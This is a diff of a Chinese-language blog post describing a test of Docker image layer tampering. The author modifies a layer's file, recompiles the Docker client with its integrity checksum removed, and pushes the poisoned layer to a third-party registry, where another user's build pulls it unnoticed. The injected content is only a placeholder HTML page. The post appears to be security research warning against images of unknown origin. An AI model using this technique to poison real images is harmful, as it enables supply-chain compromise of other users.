@@ -13,7 +13,7 @@ tags: [nginx,docker]
 
 在下文中描述了我的各种测试的实践过程，也是为了加深对Docker的了解，虽然我事先就知道这个bug被修复了。
 
-但是`请不要随便用别人给你的Repository 地址，即使是正规的CAAS平台上的也要小心三分`
+但是`请不要随便用别人给你的Repository 地址，即使是正规的CAAS平台上的也要小心三分`。
 
 因为之前我[介绍Rancher](http://www.philo.top/2015/11/29/RancherOStest/)之后。大家可以看看部署量[https://console.tenxcloud.com/docker-registry/detail?imageName=philo/rancheros](https://console.tenxcloud.com/docker-registry/detail?imageName=philo/rancheros)当然我没有恶意篡改过layers内容。
 
@@ -23,10 +23,10 @@ tags: [nginx,docker]
 
 通过nginx网页来测试恶意代码是否能进入到其他用户的容器。
 
-1. 构建一个带正常内容网页的image
-2. 推送到docker hub
-3. 修改layers，注入恶意代码， 推送到时速云
-4. 换个用户在然后使用image 基于docker hub上的image
+1. 构建一个带正常内容网页的image。
+2. 推送到docker hub。
+3. 修改layers，注入恶意代码， 推送到时速云。
+4. 换个用户在然后使用image 基于docker hub上的image。
 5. 推送到时速云看看image是否已经存在，如果存在那么注入就成功了，如果不存在那么registry v2就没有此类安全问题了。
 
 ## 实践
@@ -69,7 +69,7 @@ it works
 root@Love:~/testinjection# docker build -t lijianying10/nginxtest1:0 .
 ```
 
-查看新的image的layers
+查看新的image的layers。
 ```
 root@Love:~/testinjection# docker history lijianying10/nginxtest1:0
 IMAGE               CREATED              CREATED BY                                      SIZE                COMMENT
@@ -77,11 +77,11 @@ IMAGE               CREATED              CREATED BY                             
 d33adc4d8484        About a minute ago   /bin/sh -c #(nop) COPY file:bc24671d305c24a3d   9 B
 ```
 
-多了上面这两层
+多了上面这两层。
 
 ### 选择d33adc4d8484这个层作为攻击目标
 
-push 到dockerhub
+push 到dockerhub。
 ```
 root@Love:~/testinjection# docker push lijianying10/nginxtest1:0
 The push refers to a repository [docker.io/lijianying10/nginxtest1] (len: 1)
@@ -101,7 +101,7 @@ a631f743c7d3: Image successfully pushed
 6d1ae97ee388: Image successfully pushed
 0: digest: sha256:7c2c29250120abf80723fdd833296f88bb8695642fb69bb3c9c1b67031b6b86a size: 26486
 ```
-不知道为啥有的不是already exists
+不知道为啥有的不是already exists。
 
 在aufs中找到攻击目标中的文件：
 ```
@@ -118,7 +118,7 @@ Love - - [12/Dec/2015:19:11:38 +0000] "GET /1577f46edfae12423a1985800c018318.htm
 root@Love:~# curl http://co.newb.xyz:8888/1577f46edfae12423a1985800c018318.html
 Code Injection
 ```
-容器运行并未对文件完整性做检查
+容器运行并未对文件完整性做检查。
 
 然而我篡改代码后ID并没有改变：
 ```
@@ -128,7 +128,7 @@ IMAGE               CREATED             CREATED BY                              
 d33adc4d8484        14 minutes ago      /bin/sh -c #(nop) COPY file:bc24671d305c24a3d   9 B
 ```
 
-去污染Tenxcloud
+去污染Tenxcloud。
 ```
 root@Love:/var/lib/docker# docker tag lijianying10/nginxtest1:0 index.tenxcloud.com/philo/nginxtest1:0
 root@Love:/var/lib/docker# docker push index.tenxcloud.com/philo/nginxtest1:0
@@ -137,8 +137,8 @@ The push refers to a repository [index.tenxcloud.com/philo/nginxtest1] (len: 1)
 d33adc4d8484: Buffering to Disk
 file integrity checksum failed for "usr/share/nginx/html/1577f46edfae12423a1985800c018318.html"
 ```
-发现有checksum 
-https://github.com/docker/docker/issues/1105
+发现有checksum 。
+[这个Issue已经描述过类似问题](https://github.com/docker/docker/issues/1105)
 这里面说早期版本里面就直接可以重新算,而且已经修复了。所以不能通过删除checksum来推送。
 
 但是在客户端而且docker是开源的我直接把不要的逻辑修掉。
@@ -157,7 +157,7 @@ if !bytes.Equal(c.Sum(nil), entry.Payload) {
 ```
 嗯哼就是这里了。干掉他！
 
-重新编译docker这个版本
+重新编译docker这个版本。
 ```
 Client:
  Version:      1.8.1
@@ -197,7 +197,7 @@ a631f743c7d3: Image successfully pushed
 0: digest: sha256:cc9926b902b4db360a8a54f5ca420d018b352d60e0a2c89029ed0bc0e80048b2 size: 26479
 ```
 
-找台机器看看结果
+找台机器看看结果。
 
 
 ```
@@ -222,11 +222,11 @@ Remove login credentials for index.tenxcloud.com
 ```
 
 用户正常构建测试他的image：
-注意： 1577f46edfae12423a1985800c018318.html 代表注入的恶意程序比如说注入到bash mysql等等常用程序脚本里面
-        hello.html 代表用户正常程序
+注意： 1577f46edfae12423a1985800c018318.html 代表注入的恶意程序比如说注入到bash mysql等等常用程序脚本里面。
+        hello.html 代表用户正常程序。
         curl为手动调用过程 ， 在实际的恶意程序中由用户的主动调用来实现注入恶意代码。
 
-用户从DockerHub中拉取内容构建Image
+用户从DockerHub中拉取内容构建Image。
 ```
 root@Love:~/testinjection# cat Dockerfile
 FROM lijianying10/nginxtest1:0
@@ -264,9 +264,9 @@ Step 2 : CMD nginx -g daemon off;
 Removing intermediate container f0d84733ab86
 Successfully built 855209f4480a
 ```
-build日志中显示用户从dockerhub中拉取了攻击目标layer
+build日志中显示用户从dockerhub中拉取了攻击目标layer。
 
-用户正常测试程序
+用户正常测试程序。
 ```
 root@Love:/usr/bin# curl http://co.newb.xyz:8888/1577f46edfae12423a1985800c018318.html
 it works
@@ -347,7 +347,7 @@ Code Inje%
 ```
 
 
-## 结果是用不明来源的image是会中招的。而且id都一样无法肉眼辨识
+## 结果是用不明来源的image是会中招的。而且id都一样无法肉眼辨识。
 所以千万不要用怪蜀黍给的Image地址。
 
 
